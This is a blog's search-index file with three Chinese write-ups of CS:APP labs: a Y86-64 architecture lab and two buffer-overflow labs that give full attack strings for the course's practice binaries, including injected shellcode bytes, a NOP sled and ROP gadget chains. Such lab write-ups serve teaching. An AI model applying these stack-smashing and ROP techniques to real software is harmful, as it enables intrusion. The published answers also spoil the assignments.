<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[csapp-Archlab]]></title>
    <url>%2F2019%2F01%2F18%2Fcsapp-Archlab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第四篇文章。具体题目请见官网。本文主要讲csapp中的architecture lab的流程和心得。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话)。 同样的，在正式开始实验之前，建议先把官方的资料看一遍，保证对实验需要做什么，怎么做有一定的了解。总体来说，本实验在不追求满分的情况下，还是很容易通过的。主要难度都是在part C上，尤其要优化到高分十分困难，笔者最后的得分为56.3/60.0，仅供参考。 architecture lab 实验要求 这个实验总共分为三个部分，part A, part B, part C。其中，第一部分要求我们将三个用C写的函数翻译成y86-64指令，第二部分要求我们往seq ISA中添加一个新的指令iaddq。第三个部分给了我们一个ncopy的函数和一个pipeline的hcl文件，要求我尽可能地加快程序运行的速度。结果是用CPE(cycles per element)来衡量。达到9.0即算实验通过，7.5为满分。 实验文件(主要用到的在三个文件夹当中)misc：part A 需要用到的文件夹seq： part B 所在文件夹pipe：part C 所在文件夹 实验目的 加深对CPU的指令集架构的了解，理解pipeline的基本实现原理 理解hardware和software之间的基本联系。简单了解它们之间是如何配合协作的 掌握一些程序优化的简单方法 y86-64 模拟器的配置 个人认为，这个应该是本实验最麻烦的一个点了。话了很长的时间，出了各种bug，下面进行安装过程进行简单的介绍。 所用系统为:arch-linux。不同版本对同一个问题的解决方法可能不太一样，但大体上有相似之处，下面仅供参考 tcl/tk 如果不想安装GUI界面的同学可以忽略此步 首先，本实验比较老，需要用到的tcl/tk版本号为8.5，8.6以上的版本没办法正常使用。然而，现在直接下载默认的应该是8.6版本的，因此我们需要制定版本号。在arch下，本人是直接使用yay（需要自行安装）进行下载。 yay tcl85 // yay tk85 这样的命令行即可。然后我们进入sim文件夹下。使用make编译。发现报错了。出现了类似这样的错误信息。 我们需要更改makefile文件。如下图所示(记得对照清楚一下)。 再次进行编译。又报出新的错误。错误信息大概是这样。 psim.c:23:10: fatal error: tk.h: No such file or directory #include &lt;tk.h&gt;compilation terminated. 看错误信息，我们发现，编译的时候找不到tk.h这个函数库。因此，我们去系统的函数库里面看一下，进入Root/usr/include文件夹下，ctrl+f搜索，我们发现tk.h放在了tk8.5这个文件夹下，因此编译的时候在include文件夹下找不到tk.h。我们只需要将psim.c中的tk.h更改为tk8.5/tk.h即可。(同理，ssim.c也需要修改) 好了，这个时候再次编译，我们又发现还是过不了。出现了类似这样的错误信息。 /usr/bin/ld: /tmp/cc44VPBY.o:(.data.rel+0x0): underfined reference to ‘matherr’ matherr没有定义？？这是怎么回事。我们进入matherr所在文件(psim.c和ssim.c)看一下。找到了这样的两行代码： extern int matherr();int *tclDummyMathPtr = (int *) matherr; 直接注释掉即可。最后，我们再进行编译。在sim文件夹下make clean; make 我们成功地完成了GUI界面的编译。当然，要是过不了也没有什么关系，我们可以把上面图片中makefile那三行注释掉，这样编译出来的是文本界面，但不需要tcl/tk，也就不会一直报错了。 实验正文part A 这部分其实没什么好讲的。就是简单地把一个函数翻译成y86-64代码而已。在misc文件夹下新建文件sum.ys，把自己翻译的代码打进去然后用yas编译，yis运行即可，最终%rax的数据为0xcba即正确了。自己可以进行校对。下面是我的sum.ys的代码。其余两个不贴上来了。主要是注意一下一开是要先设置pos，还有把栈顶放在%rsp上面即可。123456789101112131415161718192021222324252627282930313233343536.pos 0init: irmovq Stack, %rsp call Main halt .align 8ele1: .quad 0x00a .quad ele2ele2: .quad 0x0b0 .quad ele3ele3: .quad 0xc00 .quad 0Main: irmovq ele1,%rdi call sum_list retsum_list: irmovq $0,%rax jmp testloop: mrmovq 0(%rdi),%rcx addq %rcx,%rax mrmovq 8(%rdi),%rcx rrmovq %rcx,%rditest: andq %rdi,%rdi jne loop ret .pos 0x100Stack: part B 这个部分同样比较简单，添加一个IIADDQ指令。文件位于/seq/seq-full.hcl 我们只需要在以下几个变量中添加IIADDQ的判断即可。 instr_valid need_regids need_valC dstE中结果为rB的分支 aluA中结果为valC的分支 aluB中结果为valB的分支 setCC 经过资料中的几个测试后，该题顺利解决。 part C 这道题很难，尤其是如果要追求满分的话。当然，要有分也没那么容易。在pipe文件夹下： ./correctness.pl // 检测自己的答案是否正确./benchmark.pl // 测试自己的分数是多少 这道题我们能操作的文件就只有pipe.hcl和ncopy.ys。也就是说，分别从硬件和软件两个方面进行优化。首先是hcl文件，很显然，官方资料已经提示了我们，本题需要实现iaddq指令，这样做起来方便很多，可以将CPE降到13左右吧。虽然还是0分。具体和part B极其相似，这里不再赘述。 由于资料中还提示我们，建议去看loop unrolling的部分，这告诉了我们，本题最大的优化在循环展开这里。于是，笔者不得不先提前去看了一下书上循环优化部分的内容。为什么循环优化能够提高那么多呢？ 注意到我们的每次循环过程中，迭代器都要+1，并且src和dst两个指针也要对应地发生移动，然而，这样的指令对于我们答案的得出并没有实质性的直接帮助，因此，我们应该尽量减少这样的指令的产生比如：1234567int sum = 0;for (int i = 0;i &lt; n; i++)sum += a[i];int sum = 0;for (int i = 0;i &lt; n; i+=2)sum = sum + a[i] + a[i+1]; 两个程序进行对比，很明显，下面的程序的效率要远远高于上面那个。尤其当n越大时，效果更明显。而题目给的程序中，需要递增的有三个数，这就使得循环优化变得更加重要。对于循环k路的选择上面，个人选择了k = 8。即每次n的变化应该是8。总体上来说，和四路的效率比较接近。具体实现过程中，整体思路是，先将n - k, 然后再进行n/k轮迭代，最后再把余数进行处理。具体可以见最下方的参考 进行了循环优化以后，我们还发现，程序中有类似这样的两行。 mrmovq (%rdi),%r10rmmovq %r10,(%rsi) 记性比较好的读者应该会记得，书中有提到过这样的例子。第二行的rmmovq指令执行到decode stage时，上面那一行还在execute stage，这个时候，我们并不知道(%rdi)的值具体是多少，也就是说，这个时候我们没办法通过data forwarding将数据送往decode stage。于是，rmmovq指令只好停留在本阶段，于是我们浪费了一个clock cycle，这是一种典型的load interlock, 处理办法是将另一个指令插入这两个指令中。然而下面的andq %r10,%r10指令我们也用不了，同样需要读取%r10，无法避免cycle的浪费. 因此，我们选择将下面的一个mrmovq提到上面来，即变成 mrmovq (%rdi),%10mrmovq 8(%rdi),%r9rmmovq %r10,(%rsi) 这样以来就不会发生cycle的浪费了。这个时候我们再进行测试的话，分数应该已经挺高了。当然，还有一些小小的优化可以调整。比如余数的处理上等等。这里给一个看到的处理得比较好的文章供参考，这篇文章作者还使用了一个三叉搜索树构造跳转表，再一次提高了效率(已经接近满分了)。这里我就不再赘述了。 其实我们会看到，想要提高CPE(CPI)，其实最主要就是三个方面，一个是use/load的冲突，如上面的mrmovq和rmmovq，这会消耗掉一个cycle；第二个是return语句，由于pipeline的设计，我们不知到会跳哪个位置，只能等到return执行到memory stage的时候才能确定，这将会浪费掉三个cycle；还有一个就是JXX中的条件跳转(非条件没有影响)，一旦分支预测错误，将会浪费掉两个cycle，而跳转指令在我们的程序中又特别的常见，因此，这是我们很大的一个优化方向，不仅是在这个实验当中。对于一个跳转指令，在特定的ISA下，我们应该尽量想办法在软件层面做处理，提高分支预测的准确率(比如在可能的情况下用data flow替换掉control flow)。书中也提到，现代的处理器的stage是远不止五个的，一旦分支预测出现错误，处理器调整的开销将长达十几个时钟周期。这个应该也是我看第四章留下的印象最深刻的地方吧。 下面是我的代码(其中也用到了其他一些小优化，比如分支的调整之类的)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138xorq %rax,%rax # count = 0iaddq $-8,%rdx # n - 8jl Test # if n &lt; 8 jump to TestLoop: mrmovq (%rdi),%r10 mrmovq 8(%rdi),%r9 andq %r10,%r10 rmmovq %r10,(%rsi) jle Npos1 iaddq $1,%raxNpos1: andq %r9,%r9 rmmovq %r9,8(%rsi) jle Npos2 iaddq $1,%raxNpos2: mrmovq 16(%rdi),%r10 mrmovq 24(%rdi),%r9 andq %r10,%r10 rmmovq %r10,16(%rsi) jle Npos3 iaddq $1,%raxNpos3: andq %r9,%r9 rmmovq %r9,24(%rsi) jle Npos4 iaddq $1,%raxNpos4: mrmovq 32(%rdi),%r10 mrmovq 40(%rdi),%r9 andq %r10,%r10 rmmovq %r10,32(%rsi) jle Npos5 iaddq $1,%raxNpos5: andq %r9,%r9 rmmovq %r9,40(%rsi) jle Npos6 iaddq $1,%raxNpos6: mrmovq 48(%rdi),%r10 mrmovq 56(%rdi),%r9 andq %r10,%r10 rmmovq %r10,48(%rsi) jle Npos7 iaddq $1,%raxNpos7: andq %r9,%r9 rmmovq %r9,56(%rsi) jle Npos8 iaddq $1,%raxNpos8: iaddq $64, %rdi # add the *src, *dst iaddq $64, %rsi iaddq $-8, %rdx # sub i jge Loop # loopTest: # n + 8 to deal with remaining numbers iaddq $8,%rdx jne Rem1 retRem1: mrmovq (%rdi), %r10 mrmovq 8(%rdi), %r9 andq %r10, %r10 jle Pos1 iaddq $1, %raxPos1: rmmovq %r10, (%rsi) iaddq $-1, %rdx jne Rem2 retRem2: andq %r9, %r9 jle Pos2 iaddq $1, %raxPos2: rmmovq %r9, 8(%rsi) iaddq $-1, %rdx jne Rem3 retRem3: mrmovq 16(%rdi), %r10 mrmovq 24(%rdi), %r9 andq %r10, %r10 jle Pos3 iaddq $1, %raxPos3: rmmovq %r10, 16(%rsi) iaddq $-1, %rdx jne Rem4 retRem4: andq %r9, %r9 jle Pos4 iaddq $1, %raxPos4: rmmovq %r9, 24(%rsi) iaddq $-1, %rdx jne Rem5 retRem5: mrmovq 32(%rdi), %r10 mrmovq 40(%rdi), %r9 mrmovq 48(%rdi), %r8 andq %r10, %r10 jle Pos5 iaddq $1, %raxPos5: rmmovq %r10, 32(%rsi) iaddq $-1, %rdx jne Rem6 retRem6: andq %r9, %r9 jle Pos6 iaddq $1, %raxPos6: rmmovq %r9, 40(%rsi) iaddq $-1, %rdx jne Rem7 retRem7: andq %r8, %r8 jle Pos7 iaddq $1, %raxPos7: rmmovq %r8, 48(%rsi) 总结 这个实验本身来说难度并不能算大，甚至比课后练习还要稍微容易一点，但是需要对CPU的pipeline有比较清晰的了解，否则做起来会特别的吃力。由于我自己本身是读软件方面的，对硬件很多东西其实也不怎么了解(基本上师兄在说的时候也是觉得这一章可以不用怎么看)，加上现在才大一，很多知识，比如电路方面的都还没学，看得时候都要查一下一些概念什么的。当然最后我还是坚持顽强地把它啃下来了(算上实验和各种其他杂七杂八的东西，总共花了一个星期多一点吧)。花了很长的时间，尤其是pipeline那一块，到现在都觉得自己的理解并不是很到位，还有一些小细节没有搞清楚。我也不知到为什么一个读软件的要对涉及到已经几乎是硬件层面的东西要这么花时间，我也不知到自己花了这么长的时间去看这个究竟有没有意义。可能这就是对计算机的热爱吧(逃]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>y86-64</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Buflab]]></title>
    <url>%2F2019%2F01%2F15%2Fcsapp-Buflab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第四篇文章了。具体题目请见官网。本文主要讲csapp中的buflab的部分流程和心得。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话)。 本文建立在csapp完成了attacklab的基础上。如果还没完成上一个实验，请先将其完成再进行本实验。不过个人觉得上一个实验能够独立完成的话，这个实验难度就真的很小了。同样的，还是很建议先把官方给的资料看了之后再来做这个实验。不过笔者这边电脑看的时候有一些乱码，不知道其他电脑会不会一样。 buflab 实验要求 这个实验要求我们使用缓冲区溢出漏洞对bufbomb进行攻击。总共5个关卡。 实验文件bufbomb：我们需要攻击的对象hex2raw：帮助我们成功攻击字符串的文件makecookie：根据用户id产生对应的cookie (./makecookie [userid] 即可生成, 注意将[userid]替换成自己喜欢的字符串)12345678910void test() &#123; int val; val = getbuf(); printf("No exploit. Getbuf returned 0x%x\n", val);&#125;unsigned getbuf() &#123; char buf[BUFFER_SIZE]; Gets(buf); return 1;&#125; buflab 的一些注意点 首先，本实验和上一个实验相比的话，难度还是要小了很多的。基本上除了最后一个level之外都没什么难度。但有一些不一样的细节需要注意 1. bufbomb在编译的时候加上了 -m32 参数，意味着无论你的电脑是否是64位系统，编译器遵循的都是IA-32规则。也就是说，我们需要用到的函数地址，指针等都是32位，这点和上一个实验不同，需要很小心。 2. 本实验中参数的传递比较接近RISC，参数是放在栈当中进行传递的，而不是放在%rdi,%rsi这样的寄存器上。所以建议完成本实验时，还是要多画图，结合图像来看的话要简单易懂很多。 3. 本实验和上一个实验基本上的架构是很相似的，我们需要做的事情也差不多，因此一些做法可以借鉴上一个实验中的相关关卡。 level 0 首先，我们还是一样，先用objdump反编译，得到bufbomb.txt文件，便于查看。前面四道题中，都调用到了这样的函数：123456#define NORMAL_BUFFER_SIZE 32unsigned getbuf() &#123; char buf[NORMAL_BUFFER_SIZE]; Gets(buf); return 1;&#125; 可以看到，和上一个实验基本没有区别。对于第一题来说，我们需要成功进入smoke()函数，只需将要丢弃的一大段字节随便填充上去，最后overwrite返回的地址即可。注意，这里的地址只有四个字节。答案就不贴了。 level 1 这道题需要我们val这个数值传入fizz()函数，并且val等于我们的cookie。很简单，注意到这道题中传递参数是用栈来实现的，我们只要把cookie放在栈上即可，连代码注入都不需要。但一定要很小心字节的顺序，在这种问题上卡住还是很吃亏的。答案如下(其中60可以随意替换成其他值)： 60 60 60 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 42 8c 04 08 // 跳转到fizz函数入口60 60 60 60 c0 e5 c4 53 // 此行为cookie，注意前面的四个字节不能省掉 level 2 对于这道题，我们需要修改一个全局变量global_value的值，使其等于cookie。这道题就需要用到代码注入了。123mov $0x53c4e5c0,%eax // 左侧的值为cookie，我们先将其移动到%eaxmov %eax,0x804d100 // 放入global_value所在的内存单元(这里的地址可以直接看反汇编文件得到)ret 将上面的汇编代码编译，并反编译之后，我们就得到了它对应的机器级表示。在放进我们的文件(这里是bufbomb3.txt)当中，使用cat bufbomb3.txt | ./hex2raw | ./bufbomb -u [userid] 命令即可。我的bufbomb.3txt文件内容为： 60 60 60 60 60 60 60 60b8 c0 e5 c4 53 a3 00 d104 08 c3 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 00 39 68 559d 8c 04 08 level 3 这道题开始有一定的难度了。本题目要求我们使用代码注入并且不能破坏原有的栈数据，最后使得getbuf函数返回cookie。有比较多的细节需要我们去注意。 首先，我们需要想到，怎样才不会破坏原有的栈数据呢？首先，我们不能覆盖到return address再往上的数据，也就是说，我们输入的字符串长度不能超过48，否则原有的某些数据可能会被我们覆盖。其次，在bufbomb的反汇编文件中，getbuf有push %ebp这样的指令将%ebp保存在栈上，而当我们覆盖了return address后，显然这个数据就丢失了。那怎么办？注意到这道题目中栈的位置不会发生改变。我们可以用gdb调试，在这个函数打一个断点，然后打印出放在栈上的这个值。到时在注入代码的时候记得把这个值放到%ebp即可。 为了能够顺利地回到test函数中，我们还要查看一下test函数在call getbuf后的下一个指令的位置，在我们的代码中要将PC更改为这个值，这样程序看起来就像是从getbuf当中返回了。 因此，我们可以得到答案： 60 60 60 60 60 60 60 60b8 c0 e5 c4 53 68 be 8d // 将cookie放到%eax, 并把test中的下一个指令位置push进栈04 08 c3 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 60 60 60 6050 39 68 55 00 39 68 55 // 后面四个字节跳转到我们注入了代码的地址，前面四个字节对应着%ebp的值，pop的时候就会被放回%ebp了 level 4 不得不说，这道题当纯看题目要求时，觉得还是很变态的。首先，我们需要做到level3中的所有要求。其次，getbuf会被调用5次，我们需要每一次都能满足要求。并且，比较难的一点是，每一次getbuf的时候，stack的%esp(%ebp)指针的位置是不确定的，这也就意味着，我们没办法精确地跳转到我们注入的代码的位置。当然，如果还有印象的话，书中有提到对付ASLR的一种办法，就是使用nop指令，nop即no operation，CPU不会进行任何操作，相当与直接跳过这个指令。我们可以在注入的代码前面加入大量的nop，这样的话只要能够跳转到任意一个nop指令，PC就会像滑雪橇一样滑到我们注入的代码。我们只需要在最后的几行实现保存即可。 要保证栈不被破坏，我们在注入的代码中还需要做到以下几点： 1. 找到%ebp对应的值，并将其写入其中。 2. 将cookie放入%eax中，作为返回值 3. 注入代码的末尾需要将testn中的下一条指令push进栈当中，这样才能顺利返回到testn。同时，整个代码的总字符数必须为528，多了就溢出，栈被破坏，少了的话没办法覆盖掉return address。 其中2和3和上一个level没有区别，最主要是第一个，既然%ebp已经被覆盖了，我们要怎么知道它原先的值是多少呢？其实，我们可以从反汇编文件得到答案。%ebp其实就是testn的堆栈帧，我们看testn函数，它在push操作后，将%esp赋值给了%ebp，然后自己减掉了0x24，也就是说，call getbuf刚进入时，%esp + 0x24 + 4 = %ebp， 通过画图像，我们就可以很容易得到相关的规律了。小心push的时候%esp会-4。 以下是我的答案： 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 b8 c0 e5 c4 53 68 3a8e 04 08 8d 6c 24 2c c3 90 90 90 90 00 38 68 55]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>overflow</tag>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Attacklab]]></title>
    <url>%2F2019%2F01%2F15%2Fcsapp-Attacklab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第三篇文章。具体题目请见官网。本文主要讲csapp中的attacklab的流程和心得。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话)。 个人觉得这个实验比起前面两个还是要稍微简单一点的，但是强烈建议把官网给的资料看一下，看完相信对完成这个实验还是有很大帮助的。整个实验主要是一开始无从下手以及最后一个level比较麻烦，但结合资料的相关提示的话，做起来难度还是不大的，建议尝试着不看任何其他教程自己独立完成。 attacklab 实验要求 这个实验要求我们使用缓冲区溢出对ctarget和rtarget进行攻击。总共有五个关卡，其中，前三个要求使用代码注入(code injection)对ctarget进行攻击，后面两个要求使用return-oriented programming(ROP)对rtarget进行攻击。 实验文件：ctarget 和 rtarget：我们需要攻击的对象。hex2raw：帮助我们用来生成攻击字符串的文件。cookie: 识别文件，用来区分不同的用户(一般拿到的值是一个随机的8位16进制数)farm.c：用于提供gadget，与后面两个关卡有关。 实验目的：熟练掌握gdb和objdump的相关功能加深对缓冲区溢出现象的理解，以及懂得如何简单地对某个程序进行缓冲区溢出攻击了解x86-64的一些指令的编码等 target 文件的一些注意点 无论是rtarget还是ctarget两个文件都有相似的构造。两个文件都包含有下面的函数。12345678910void test() &#123; int val; val = getbuf(); printf("No exploit. Getbuf returned 0x%x\n", val);&#125;unsigned getbuf() &#123; char buf[BUFFER_SIZE]; Gets(buf); return 1;&#125; 其中，BUFFER_SIZE是宏定义，我们暂时不知道是多少，然后Gets()函数和gets()函数的功能基本相同。很明显，一旦我们输入的字符串比较长的时候，这就会产生缓冲区溢出的现象。因此，我们需要利用这一点，对该程序进行攻击。具体其他很多函数的细节，其实可以完全不去管。我们需要做的仅仅是生成一个特定的满足要求的字符串，通过overwrite栈上面的数据，使得getbuf函数无法顺利返回，并且，成功运行事先就存在于文件中的函数touchx()。 再次强调一下，所有需要了解的相关细节和知识点在官方资料中都有提到，本文基本上只是对该资料的部分内容进行翻译，以及提供一个完成该实验的思路，仅供参考。 Part I：level 1 第一题比较简单，是让我们熟悉一下相关的一些操作。在正式开始实验以前，建议先使用objdump将rtarget和ctarget反编译，可以使用类似objdump -d ctarget &gt; ctarget.txt 等命令将反编译文件写入txt中，便于查看。 我们先看一下getbuf中BUFFER_SIZE究竟是多少。查看ctarget.txt中的内容有以下几行：12345678900000000004017a8 &lt;getbuf&gt;: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 &lt;Gets&gt; 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq 4017be: 90 nop 4017bf: 90 nop 由上图，我们可以看到，BUFFER_SIZE应该是一个小于40(0x28)的数字。%rsp+0x28上存放的地址就是函数正确返回的时候，PC需要指向的地址。这也是我们需要overwrite的地方。123456void touch1() &#123; vlevel = 1; printf("Touch1!: You called touch1()\n"); validate(1); exit(0);&#125; 如上图，touch1不需要我们传入任何参数，因此我们只需要将返回地址覆盖为touch1的入口地址即可。注意这里是采用小端法。 注意到，一个函数返回时，对应的汇编语句为 ret，这个时候程序会取出位于栈顶的8个字节的数据，并将其弹出，最后再将PC(program counter)更改为从栈顶取出的那个数据，本质上这其实就是一个control transfer的过程，将控制权从一个函数转移到另一个函数。答案可以为： 61 61 61 61 6161 61 61 61 6161 61 61 61 6161 61 61 61 6161 61 61 61 6161 61 61 61 6161 61 61 61 6161 61 61 61 61c0 17 40 00 00 00 00 00 /* 这一行即为touch1的入口地址。前面的40个字节在函数返回时相当与丢失了。 */ 将上图中的编码存在某个文件中(这里我存在ctarget1.txt中)，然后使用如下指令即可(注意ctarget和hex2raw应该在当前目录下)： cat ctarget1.txt | ./hex2raw | ./ctarget -q Part I： level 2 有了上一题的基础，我们对实验稍微熟悉一些了。接下来的我们需要进入touch2函数了。12345678910void touch2(unsigned value) &#123; vlevel = 2; if (val == cookie) &#123; ... validate(2); &#125; else &#123; ... fail(2); &#125;&#125; 这个函数需要我们传入一个参数，同时这个参数还要和cookie相等(还记得实验文件中有一个cookie吗？这个cookie就是就是那个文件里面的数字的值)。 由于需要传入参数，没那么好处理了。这个时候我们就需要注入自己的代码了。 我们需要实现这样的一个指令： mov $cookie, %rdi // cookie为和每个用户对应的那个数字ret 为了获取这个指令的机器级表示，我们可以用gcc将其编译成obj，再用objdump反编译，可以得到对应的机器码。然后，再将其写入txt文件中即可。这里，我的答案是： bf fa 97 b9 59 /* Set %rdi to cookie*/c3 60 60 60 60 /* transfer control to touch2 */60 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6078 dc 61 55 00 00 00 00ec 17 40 00 00 00 00 00 %rsp+028并且函数返回之后，PC将指向0x5561dc78，在这里即为bf字节对应的地址。顺利执行完mov语句后，执行c3(ret指令)，PC将指向0x4017ec，这里即为函数touch2的入口地址。继续，使用类似上面的命令将攻击字符串导入，第二题顺利解决。 Part I： level 3 和上一题类似，本题需要传入的是一个char指针，即将cookie的那串数字看成字符串。注意，0x不包含在这个字符串当中。同样的，我们可以使用类似上一题的方法，将我们需要的代码和cookie字符串(这里应该查询ASCII码，找到自己的那个串中每个字符对应的数字为多少)注入其中。 值得注意的是，本题有一个陷阱，当执行touch3的时候，touch3内部执行了hexmatch函数，这里会覆盖掉栈中我们注入的一些数据。但注意到栈是往下生长的，我们只要把cookie字符串放在上面即可。以下为我的答案： 60 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 60b0 dc 61 55 00 00 00 00 // 覆盖掉原先的返回地址，指向下方我们注入的那个函数fa 18 40 00 00 00 00 0048 c7 c7 c0 dc 61 55 c3 // 这一行将cookie的首地址mov到%rdi上，并返回00 00 00 00 00 00 00 0035 39 62 39 39 37 66 61 // 这一行为我的cookie值 Part II： level 2 这一道题开始，难度有点加大了。在rtarget文件中，采用了地址空间布局随机化，以及限制栈上的代码无法被执行等方式，使得我们无法采用代码注入对程序进行攻击。这个时候我们需要采用return-oriented programming（ROP）技术来攻击代码。具体如下图。123void setval_210(unsigned \*p) &#123; \*p = 3347663060U;&#125; 对于上面这个函数，我们看起来好像没有什么特别的。但倘若从机器码的角度来看呢？ 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4, (%rdi)400f1b: c3 retq 好像还是没有什么特别的。但我们注意到，48，89，c7还可以被理解成另一种意思。如果这个函数是从400f18地址开始的，那么将变成： 400f18: 48 89 c7 movq %rax, %rdi400f1b: c3 retq 整个程序的意思完全变了！这就是ROP的特点。利用别人自身的代码攻击别人。只要换了一个位置开始解读，整个程序的结果就会发生很大的变化。我们要做的正是利用这一点来攻击rtarget。为了方便我们的攻击，rtarget中含有很多类似上面这样的容易攻击的函数。从start_farm开始，到end_farm都是我们可以利用来攻击的gadget。 这个时候我们再来看一下题目的要求。我们需要使用ROP进入touch2中，并且传入正确的cookie。进入touch2还容易，可cookie怎么找？直接找源代码中有没有读应的字节序列吗？这不太可能。注意到还有这个代码popq，对应的编码为0x58~0x5f。怎么用呢？我们实现将cookie注入栈上，然后跳转到某个指令。popq将这个cookie取下，并放在某个寄存器中。然后在将其移动到%rdi。最后再跳转到touch2完成任务。 以下是我的答案： 60 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 60ab 19 40 00 00 00 00 00 // 跳转到0x4019ab，实现popq，将cookie取下fa 97 b9 59 00 00 00 00 // 我自己的cookiea2 19 40 00 00 00 00 00 // 跳转到0x4019a2，将cookie移动至%rdiec 17 40 00 00 00 00 00 // 跳转到0x4017ec，即touch2所在地址 Part II： level 3 这道题需要实现跳转到touch3中，并且传入char指针，指向我们的cookie字符串。明显有一定难度。官方资料中将我们可能需要用到的指令列出来。如下。 由官方所给的提示，我们知道答案应该主要是用mov指令来实现的。注意到mov指令均含有89这个数字，我们可以使用ctrl+f查找有可能被我们用到的gadget。再次，我找到的如下。左边为该实现该指令需要跳转向的地址。123456789101112131415161718192021222324254019ab 58 pop %rax 90 nop c3 ret4019a2 48 89 c7 mov %rax, %rdi c3 ret4019dd 89 c2 mov %eax, %edx 90 nop c3 ret401a06 48 89 e0 mov %rsp, %rax c3 ret401a69 89 d1 mov %edx, %ecx 08 db orb %bl, %bl c3 ret401a42 89 c2 mov %eax, %edx 84 c0 testb %al, %al c3 ret401a27 89 ce mov %ecx,%esi 38 c0 cmpb %al, %al c3 ret 我们如果直接将字符串放在栈当中，但我们又不知到位置，没办法得到对应的指针。因此我们想采用栈顶指针+偏移量的做法。一开始，笔者在这里卡了非常久，一直找不到比较好的办法来解决。直到我看见了farm中有这样一个函数：123long add_xy(long x, long y) &#123; return x+y;&#125; 所以答案，瞬间解决了。按顺序，总共8个gadget，每一个gadget对应的汇编代码如下(ret省去)：12345678mov %rsp, %raxmov %rax, %rdipop %raxmov %eax, %edxmov %edx, %ecxmov %ecx, %esileaq (%rdi, %rsi, 1) %raxmov %rax %rdi 以下是我的答案： 60 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6006 1a 40 00 00 00 00 00a2 19 40 00 00 00 00 00ab 19 40 00 00 00 00 0048 00 00 00 00 00 00 00dd 19 40 00 00 00 00 0069 1a 40 00 00 00 00 0027 1a 40 00 00 00 00 00d6 19 40 00 00 00 00 00a2 19 40 00 00 00 00 00fa 18 40 00 00 00 00 0035 39 62 39 39 37 66 6100 总结 转眼间寒假已经过了好几天了。今天花了接近一天的时间完成了这个实验，以及写下这篇博客。总的来说，虽然做实验的过程很辛苦，但是做完感觉还是很舒服的。虽然我也不知到为什么想要把所有实验的过程都用博客记录下来(这么偏僻的地方应该也没有人会过来看吧)。可能是为了锻炼自己写报告的能力？？？好吧，我也不知道。还是希望自己好好加油，继续坚持写下去吧。这也才仅仅是第三篇而已，还有8篇呢。。 頑張ってくださいね～！]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>overflow</tag>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Bomblab]]></title>
    <url>%2F2019%2F01%2F12%2Fcsapp-Bomblab%2F</url>
